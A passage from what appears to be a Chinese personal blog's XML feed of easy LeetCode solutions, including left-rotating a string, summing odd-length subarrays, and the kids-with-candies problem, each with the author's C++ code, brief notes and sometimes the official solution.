m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">islandPerimeter</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = grid.size(), m = grid[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    ans += dfs(i, j, grid, n, m);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(nm)$，其中 $n$ 为网格的高度，$m$ 为网格的宽度。每个格子至多会被遍历一次，因此总时间复杂度为 $O(nm)$。</p>
</li>
<li><p>空间复杂度：$O(nm)$。深度优先搜索复杂度取决于递归的栈空间，而栈空间最坏情况下会达到 $O(nm)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解第一种方法和我的思路是一致的，第二种方法深度优先搜索也是比较重要的方法，不过对于这道简单题来讲还是复杂了些，第一种方法就挺好🤔。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>左旋转字符串</title>
    <url>/2020/11/06/%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab”。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;abcdefg&quot;, k &#x3D; 2</span><br><span class="line">输出: &quot;cdefgab&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;lrloseumgh&quot;, k &#x3D; 6</span><br><span class="line">输出: &quot;umghlrlose&quot;</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= k &lt; s.length &lt;= 10000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用用string类的函数，substr()截取前面n个字符用insert()函数插入到字符串s的后面，最后erase()删除前面n个字符</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗8M，击败9.12%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseLeftWords</span><span class="params">(<span class="built_in">string</span> s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//把前面n个字符插入到字符串后面</span></span><br><span class="line">        s.insert(s.length(),s.substr(<span class="number">0</span>,n));</span><br><span class="line">        <span class="comment">//删除字符串前面n个字符</span></span><br><span class="line">        s.erase(<span class="number">0</span>,n);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也是简单题，Let‘s go on!😐。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>所有奇数长度子数组的和</title>
    <url>/2020/11/09/%E6%89%80%E6%9C%89%E5%A5%87%E6%95%B0%E9%95%BF%E5%BA%A6%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E5%92%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/sum-of-all-odd-length-subarrays/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个正整数数组 <code>arr</code> ，请你计算所有可能的奇数长度子数组的和。</p>
<p><strong>子数组</strong> 定义为原数组中的一个连续子序列。</p>
<p>请你返回 <code>arr</code> 中 <strong>所有奇数长度子数组的和</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,4,2,5,3]</span><br><span class="line">输出：58</span><br><span class="line">解释：所有奇数长度子数组和它们的和为：</span><br><span class="line">[1] &#x3D; 1</span><br><span class="line">[4] &#x3D; 4</span><br><span class="line">[2] &#x3D; 2</span><br><span class="line">[5] &#x3D; 5</span><br><span class="line">[3] &#x3D; 3</span><br><span class="line">[1,4,2] &#x3D; 7</span><br><span class="line">[4,2,5] &#x3D; 11</span><br><span class="line">[2,5,3] &#x3D; 10</span><br><span class="line">[1,4,2,5,3] &#x3D; 15</span><br><span class="line">我们将所有值求和得到 1 + 4 + 2 + 5 + 3 + 7 + 11 + 10 + 15 &#x3D; 58</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2]</span><br><span class="line">输出：3</span><br><span class="line">解释：总共只有 2 个长度为奇数的子数组，[1] 和 [2]。它们的和为 3 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [10,11,12]</span><br><span class="line">输出：66</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 100</code></li>
<li><code>1 &lt;= arr[i] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>多个for循环遍历，遍历所有可能的奇数子数组的长度i，然后再遍历所有长度为i的子数组个数，遍历每一个长度为i的子数组求和。</p>
<p>我这个思路是直观解法，应该挺麻烦的，可能有更好的答案，等看题解吧</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败37.26%，内存消耗8.5M，击败20.68%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOddLengthSubarrays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//遍历所有的奇数子数组，i为子数组的长度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=arr.size();i+=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="comment">//遍历arr数组,j为长度为i的子数组的个数</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;arr.size()-i+<span class="number">1</span>;++j)&#123;</span><br><span class="line">                <span class="comment">//计算长度为i的每个奇数子数组的和</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;i;++k)&#123;</span><br><span class="line">                    result+=arr[k+j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>解法二</strong>：还有一种效率更高的解法就是计算每个元素在奇数长度子数组中出现的次数，通过看题解得到思路如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">* odd奇数，even偶数</span><br><span class="line">* 对于每个元素i(数组中下标为i)来说，要构成奇数长度的子数组</span><br><span class="line">  即 i左边的元素个数left+i本身自己一个+右边元素的个数right=奇数</span><br><span class="line">  即 left+right=偶数</span><br><span class="line">* 满足a+b=偶数就只有两种情况</span><br><span class="line">  <span class="number">1.</span> 奇数+奇数=偶数</span><br><span class="line">  <span class="number">2.</span> 偶数+偶数=偶数</span><br><span class="line">* <span class="number">1.</span> 所以只需要求得i左边可以选择奇数长度的可能有多少种，即left_odd,同样求右边奇数right_odd</span><br><span class="line">     就可以求出策略<span class="number">1</span>有多少种可能</span><br><span class="line">  <span class="number">2.</span> 所以只需要求得i左边可以选择偶数长度的可能有多少种，即left_odd,同样求右边偶数right_odd</span><br><span class="line">     就可以求出策略<span class="number">1</span>有多少种可能，注意<span class="number">0</span>也算选择的一种可能</span><br><span class="line">* 即元素i在所有奇数长度子数组出现的次数总和是</span><br><span class="line">  left_odd*right_odd+left_even*right_even</span><br><span class="line">* 元素i左边元素共有i个，右边元素共有siz-i<span class="number">-1</span>个</span><br></pre></td></tr></table></figure>
<p><strong>c++代码：</strong>（执行4ms，击败91.05,%，内存8.6M，击败8.85%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOddLengthSubarrays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.size(); i ++)&#123;</span><br><span class="line">            <span class="keyword">int</span> left = i + <span class="number">1</span>, right = arr.size() - i,</span><br><span class="line">                left_even = (left + <span class="number">1</span>) / <span class="number">2</span>, right_even = (right + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">                left_odd = left / <span class="number">2</span>, right_odd = right / <span class="number">2</span>;</span><br><span class="line">            res += (left_even * right_even + left_odd * right_odd) * arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，我提交的代码时间复杂度是$O(n^3)$，然后看别人的题解有复杂度$O(n)$的方法，其实就是计算每个元素在奇数长度子数组中出现的次数，做的时候我考虑过，因为时间问题就选择了这个暴力解法，毕竟也能通过不是吗😏，现在还是刷题没考虑太多最优解的问题，不然真的要花费很多时间，现在事情多也不能专门去研究这种题。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>打印从1到最大的n位数</title>
    <url>/2020/11/10/%E6%89%93%E5%8D%B0%E4%BB%8E1%E5%88%B0%E6%9C%80%E5%A4%A7%E7%9A%84n%E4%BD%8D%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/da-yin-cong-1dao-zui-da-de-nwei-shu-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>输入数字 <code>n</code>，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 1</span><br><span class="line">输出: [1,2,3,4,5,6,7,8,9]</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ul>
<li>用返回一个整数列表来代替打印</li>
<li>n 为正整数</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接遍历，简简单单。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败99.63%，内存消耗11.7M，击败8.50%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">printNumbers</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="built_in">pow</span>(<span class="number">10</span>,n);++i)&#123;</span><br><span class="line">            result.push_back(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，这题太简单了😕</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>拥有最多糖果的孩子</title>
    <url>/2020/11/06/%E6%8B%A5%E6%9C%89%E6%9C%80%E5%A4%9A%E7%B3%96%E6%9E%9C%E7%9A%84%E5%AD%A9%E5%AD%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/kids-with-the-greatest-number-of-candies/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>candies</code> 和一个整数 <code>extraCandies</code> ，其中 <code>candies[i]</code> 代表第 <code>i</code> 个孩子拥有的糖果数目。</p>
<p>对每一个孩子，检查是否存在一种方案，将额外的 <code>extraCandies</code> 个糖果分配给孩子们之后，此孩子有 <strong>最多</strong> 的糖果。注意，允许有多个孩子同时拥有 <strong>最多</strong> 的糖果数目。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：candies &#x3D; [2,3,5,1,3], extraCandies &#x3D; 3</span><br><span class="line">输出：[true,true,true,false,true] </span><br><span class="line">解释：</span><br><span class="line">孩子 1 有 2 个糖果，如果他得到所有额外的糖果（3个），那么他总共有 5 个糖果，他将成为拥有最多糖果的孩子。</span><br><span class="line">孩子 2 有 3 个糖果，如果他得到至少 2 个额外糖果，那么他将成为拥有最多糖果的孩子。</span><br><span class="line">孩子 3 有 5 个糖果，他已经是拥有最多糖果的孩子。</span><br><span class="line">孩子 4 有 1 个糖果，即使他得到所有额外的糖果，他也只有 4 个糖果，无法成为拥有糖果最多的孩子。</span><br><span class="line">孩子 5 有 3 个糖果，如果他得到至少 2 个额外糖果，那么他将成为拥有最多糖果的孩子。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：candies &#x3D; [4,2,1,1,2], extraCandies &#x3D; 1</span><br><span class="line">输出：[true,false,false,false,false] </span><br><span class="line">解释：只有 1 个额外糖果，所以不管额外糖果给谁，只有孩子 1 可以成为拥有糖果最多的孩子。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：candies &#x3D; [12,1,12], extraCandies &#x3D; 10</span><br><span class="line">输出：[true,false,true]</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>2 &lt;= candies.length &lt;= 100</code></li>
<li><code>1 &lt;= candies[i] &lt;= 100</code></li>
<li><code>1 &lt;= extraCandies &lt;= 50</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>求出数组中的最大值max，再遍历数组对每一个元素如果值加上extraCandies&lt;max,则结果为false,否则为true。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败85.21%，内存消耗9.1M，击败10.50%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; <span class="title">kidsWithCandies</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candies, <span class="keyword">int</span> extraCandies)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; result;</span><br><span class="line">        <span class="keyword">int</span> max=*max_element(candies.begin(),candies.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i:candies)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i+extraCandies&lt;max)&#123;</span><br><span class="line">                result.push_back(<span class="literal">false</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result.push_back(<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/kids-with-the-greatest-number-of-candies/solution/yong-you-zui-duo-tang-guo-de-hai-zi-by-leetcode-so/">官方题解：</a></h6><p><strong>方法一：枚举</strong><br>思路</p>
<p>如果我们希望某个小朋友拥有的糖果最多，那么最优的方案当然是把额外的所有糖果都分给这个小朋友。因此，我们可以枚举每一个小朋友，并将额外的所有糖果都分给这个小朋友，然后再用$O(n)$ 的时间遍历其余的小朋友，就可以判断这个小朋友是否拥有最多的糖果。</p>
<p>上述方法的时间复杂度为 $O(n^2)$，然而我们可以将其优化为$O(n)$。事实上，对于每一个小朋友，只要这个小朋友「拥有的糖果数目」加上「额外的糖果数目」大于等于所有小朋友拥有的糖果数目最大值，那么这个小朋友就可以拥有最多的糖果。</p>
<p><strong>证明</strong></p>
<p>设某个小朋友的糖果数为 $x$，其余小朋友拥有的糖果数目最大值为 $y$，额外的糖果数为 $e$。这个小朋友可以拥有最多的糖果，当且仅当</p>
<script type="math/tex; mode=display">
x+e \geq y</script><p>由于 $x+e≥x$ 显然成立，那么我们有</p>
<script type="math/tex; mode=display">
x+e≥max(x,y)</script><p>而 $max(x,y)$ 就是所有小朋友拥有的糖果数目最大值。因此我们可以预处理出这个值，随后枚举每一个小朋友，只要这个小朋友「拥有的糖果数目」加上「额外的糖果数目」大于等于这个值，就可以满足要求。</p>
<p><strong>代码：</strong>（执行4ms，击败85.21%，内存9.2M，击败5.13%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; <span class="title">kidsWithCandies</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candies, <span class="keyword">int</span> extraCandies)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = candies.size();</span><br><span class="line">        <span class="keyword">int</span> maxCandies = *max_element(candies.begin(), candies.end());</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; ret;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            ret.push_back(candies[i] + extraCandies &gt;= maxCandies);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>假设小朋友的总数为 $n$。</p>
<p><strong>时间复杂度：</strong>我们首先使用 $O(n)$ 的时间预处理出所有小朋友拥有的糖果数目最大值。对于每一个小朋友，我们需要 $O(1)$ 的时间判断这个小朋友是否可以拥有最多的糖果，故渐进时间复杂度为 $O(n)$。</p>
<p><strong>空间复杂度：</strong>这里只用了常数个变量作为辅助空间，与 $n$ 的规模无关，故渐进空间复杂度为 $O(1)$。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，感觉官方题解最后结果push_back比我还简洁，不知道为什么效率还没我的高呢😄，Let‘s go on!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>括号的最大嵌套深度</title>
    <url>/2020/11/09/%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%9C%80%E5%A4%A7%E5%B5%8C%E5%A5%97%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/maximum-nesting-depth-of-the-parentheses/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>如果字符串满足一下条件之一，则可以称之为 <strong>有效括号字符串（valid parentheses string</strong>，可以简写为 <strong>VPS）</strong>：</p>
<ul>
<li>字符串是一个空字符串 <code>&quot;&quot;</code>，或者是一个不为 “(“ 或 <code>&quot;)&quot;</code> 的单字符。</li>
<li>字符串可以写为 <code>AB</code>（A 与 <code>B</code> 字符串连接），其中 <code>A</code> 和 <code>B</code> 都是 有效括号字符串 。</li>
<li>字符串可以写为 (A)，其中 <code>A</code> 是一个 有效括号字符串 。</li>
</ul>
<p>类似地，可以定义任何有效括号字符串 S 的 嵌套深度 <code>depth(S)</code>：</p>
<ul>
<li><code>depth(&quot;&quot;) = 0</code></li>
<li><code>depth(C) = 0</code>，其中 <code>C</code> 是单个字符的字符串，且该字符不是 <code>&quot;(&quot;</code> 或者 “)”</li>
<li><code>depth(A + B) = max(depth(A), depth(B))</code>，其中 <code>A</code> 和 <code>B</code> 都是 有效括号字符串</li>
<li><code>depth(&quot;(&quot; + A + &quot;)&quot;) = 1 + depth(A)</code>，其中 <code>A</code> 是一个 <strong>有效括号字符串</strong></li>
</ul>
<p>例如：<code>&quot;&quot;</code>、<code>&quot;()()&quot;</code>、”()(()())” 都是 <strong>有效括号字符串</strong>（嵌套深度分别为 0、1、2），而 <code>&quot;)(&quot;</code> 、<code>&quot;(()&quot;</code> 都不是 有效括号字符串 。</p>
<p>给你一个 <strong>有效括号字符串</strong> <code>s</code>，返回该字符串的 <code>s</code> <strong>嵌套深度</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;(1+(2*3)+((8)&#x2F;4))+1&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：数字 8 在嵌套的 3 层括号中。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;(1)+((2))+(((3)))&quot;</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;1+(2*3)&#x2F;(2-1)&quot;</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;1&quot;</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
